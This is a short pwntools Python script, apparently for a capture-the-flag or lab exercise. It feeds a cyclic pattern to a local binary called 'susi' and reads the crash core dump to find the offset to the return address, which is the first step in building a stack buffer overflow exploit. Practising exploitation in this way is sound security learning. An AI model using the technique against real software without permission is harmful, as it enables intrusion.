from pwn import *

p = process('./susi')

payload = cyclic(300)

p.sendline(payload)

p.wait()
core = p.corefile

offset = cyclic_find(core.read(core.rsp, 4))
log.info(f"Offset to return address: {offset}")
